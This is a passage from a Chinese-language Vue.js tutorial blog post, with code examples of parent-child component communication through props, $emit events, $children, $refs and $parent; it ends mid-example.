data-lazy-src="https://unpkg.com/nan-picture/blog/20201027105959.png"></p><h2 id="父级向子级传递"><a href="#父级向子级传递" class="headerlink" title="父级向子级传递"></a>父级向子级传递</h2><p>在组件中，使用<strong>选项props</strong>来声明需要从父级接收到的数据。</p><p>props的值有两种方式：</p><ul><li>字符串数组，数组中的字符串就是传递时的名称。</li><li>对象，对象<strong>可以设置传递时的类型，也可以设置默认值</strong>等。</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cpn</span> <span class="attr">:cmessage</span>=<span class="string">&quot;message&quot;</span> <span class="attr">:cmovies</span>=<span class="string">&quot;movies&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span>=<span class="string">&quot;cpn&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;item in cmovies&quot;</span>&gt;</span>&#123;&#123;item&#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;cmessage&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 父传子: props</span></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> cpn = &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">template</span>: id = <span class="string">&#x27;#cpn&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// props: [&#x27;cmovies&#x27;, &#x27;cmessage&#x27;],//字符串数组的方式</span></span></span><br><span class="line"><span class="language-javascript">    <span class="attr">props</span>: &#123;<span class="comment">//对象的方式</span></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 1.类型限制</span></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// cmovies: Array,</span></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// cmessage: String,</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 2.提供一些默认值, 以及是否要求必传</span></span></span><br><span class="line"><span class="language-javascript">      <span class="attr">cmessage</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">type</span>: <span class="title class_">String</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">default</span>: <span class="string">&#x27;aaaaaaaa&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">required</span>: <span class="literal">true</span></span></span><br><span class="line"><span class="language-javascript">      &#125;,</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 类型是对象或者数组时, 默认值必须是一个函数</span></span></span><br><span class="line"><span class="language-javascript">      <span class="attr">cmovies</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">type</span>: <span class="title class_">Array</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">default</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">return</span> []</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">return</span> &#123;&#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">methods</span>: &#123;&#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">message</span>: <span class="string">&#x27;你好啊&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">movies</span>: [<span class="string">&#x27;海王&#x27;</span>, <span class="string">&#x27;海贼王&#x27;</span>, <span class="string">&#x27;海尔兄弟&#x27;</span>]</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">components</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      cpn</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><p>当需要对props进行类型等验证时，就需要对象写法了。</p><p>验证支持的数据类型：</p><ul><li>String</li><li>Number</li><li>Boolean</li><li>Array</li><li>Object</li><li>Date</li><li>Function</li><li>Symbol</li></ul><p>当我们有自定义构造函数时，验证也支持自定义的类型</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201028171445.png"><br><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201028165717.png"></p><h2 id="子级向父级传递"><a href="#子级向父级传递" class="headerlink" title="子级向父级传递"></a>子级向父级传递</h2><p>props用于父组件向子组件传递数据，还有一种比较常见的是子组件传递数据或事件到父组件中。这个时候，我们需要使用自定义事件来完成。</p><p>我们之前学习的v-on不仅仅可以用于监听DOM事件，也可以用于监听组件间的自定义事件。</p><p>自定义事件的流程：</p><ul><li>在子组件中，通过$emit()来触发事件。</li><li>在父组件中，通过v-on来监听子组件事件。</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--父组件模板--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cpn</span> @<span class="attr">item-click</span>=<span class="string">&quot;cpnClick&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--子组件模板--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span>=<span class="string">&quot;cpn&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">v-for</span>=<span class="string">&quot;item in categories&quot;</span></span></span><br><span class="line"><span class="tag">            @<span class="attr">click</span>=<span class="string">&quot;btnClick(item)&quot;</span>&gt;</span></span><br><span class="line">      &#123;&#123;item.name&#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> cpn = &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">template</span>: id = <span class="string">&#x27;#cpn&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">categories</span>: [</span></span><br><span class="line"><span class="language-javascript">          &#123;<span class="attr">id</span>: <span class="string">&#x27;aaa&#x27;</span>, <span class="attr">name</span>: <span class="string">&#x27;热门推荐&#x27;</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">          &#123;<span class="attr">id</span>: <span class="string">&#x27;bbb&#x27;</span>, <span class="attr">name</span>: <span class="string">&#x27;手机数码&#x27;</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">          &#123;<span class="attr">id</span>: <span class="string">&#x27;ccc&#x27;</span>, <span class="attr">name</span>: <span class="string">&#x27;家用家电&#x27;</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">          &#123;<span class="attr">id</span>: <span class="string">&#x27;ddd&#x27;</span>, <span class="attr">name</span>: <span class="string">&#x27;电脑办公&#x27;</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">        ]</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">btnClick</span>(<span class="params">item</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 发射事件: 自定义事件</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.$emit(<span class="string">&#x27;item-click&#x27;</span>, item)</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">  </span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">message</span>: <span class="string">&#x27;你好啊&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">components</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      cpn</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">cpnClick</span>(<span class="params">item</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;cpnClick&#x27;</span>, item);</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="父子组件的访问"><a href="#父子组件的访问" class="headerlink" title="父子组件的访问"></a>父子组件的访问</h1><h2 id="父组件访问子组件的方式：-children"><a href="#父组件访问子组件的方式：-children" class="headerlink" title="父组件访问子组件的方式： $children"></a>父组件访问子组件的方式： $children</h2><blockquote><p>有时父组件需要访问获得子组件的数据和调用子组件的方法。</p></blockquote><p>父组件访问子组件：使用$children或$refs （reference：引用）</p><p>我们先来看下$children的访问，this.$children是一个<strong>数组类型，它包含所有子组件对象</strong>。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cpn</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cpn</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;btnClick&quot;</span>&gt;</span>按钮<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span>=<span class="string">&quot;cpn&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">btnClick</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">$children</span>)</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">$children</span>[<span class="number">0</span>].<span class="property">message</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="property">$children</span>[<span class="number">0</span>].<span class="title function_">showMessage</span>()</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">components</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">cpn</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">template</span>: id = <span class="string">&#x27;#cpn&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">message</span>: <span class="string">&#x27;我是子组件&#x27;</span></span></span><br><span class="line"><span class="language-javascript">          &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="title function_">showMessage</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;showMessage&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">          &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>点击按钮后的运行结果：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201029005840.png"></p><h2 id="父组件访问子组件的方式：-refs"><a href="#父组件访问子组件的方式：-refs" class="headerlink" title="父组件访问子组件的方式： $refs"></a>父组件访问子组件的方式： $refs</h2><p>$children的缺陷：</p><blockquote><p>通过$children访问子组件时，是一个数组类型，访问其中的子组件必须通过索引值。</p><p>但是当子组件过多，我们需要拿到其中一个时，往往不能确定它的索引值，甚至其索引值还可能会发生变化。</p><p>有时候，我们想明确获取其中一个特定的组件，这个时候就可以使用$refs</p></blockquote><p>$refs的使用：</p><ul><li>$refs和ref指令通常是一起使用的。</li><li>首先，我们通过ref给某一个子组件绑定一个特定的ID。</li><li>其次，通过this.$refs.ID就可以访问到该组件了。</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cpn</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cpn</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cpn</span> <span class="attr">ref</span>=<span class="string">&quot;abc&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;btnClick&quot;</span>&gt;</span>按钮<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span>=<span class="string">&quot;cpn&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">data</span>: &#123;&#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">btnClick</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">$refs</span>.<span class="property">abc</span>.<span class="property">message</span>)</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="property">$refs</span>.<span class="property">abc</span>.<span class="title function_">showMessage</span>()</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">components</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">cpn</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">template</span>: id = <span class="string">&#x27;#cpn&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">message</span>: <span class="string">&#x27;我是子组件&#x27;</span></span></span><br><span class="line"><span class="language-javascript">          &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="title function_">showMessage</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;showMessage&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">          &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="子组件访问父组件或根组件"><a href="#子组件访问父组件或根组件" class="headerlink" title="子组件访问父组件或根组件"></a>子组件访问父组件或根组件</h2><p>如果我们想在子组件中直接访问父组件，可以通过$parent</p><p>如果我们想在子组件中直接访问根组件，可以通过$root</p><p>注意事项：</p><blockquote><ul><li>尽管在Vue开发中，我们允许通过$parent来访问父组件，但是在真实开发中尽量不要这样做。</li><li>子组件应该尽量避免直接访问父组件的数据，因为这样耦合度太高了。</li><li>如果我们将子组件放在另外一个组件之内，很可能该父组件没有对应的属性，往往会引起问题。</li><li>另外，更不好做的是通过$parent直接修改父组件的状态，那么父组件中的状态将变得飘忽不定，很不利于我们的调试和维护。</li></ul></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cpn</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span>=<span class="string">&quot;cpn&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>我是cpn组件<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ccpn</span>&gt;</span><span class="tag">&lt;/<span class="name">ccpn</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span>=<span class="string">&quot;ccpn&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>我是cpn组件的子组件<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;btnClick&quot;</span>&gt;</span>按钮<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">message</span>: <span class="string">&#x27;你好啊&#x27;</span></span></span><br><span class="line"><span 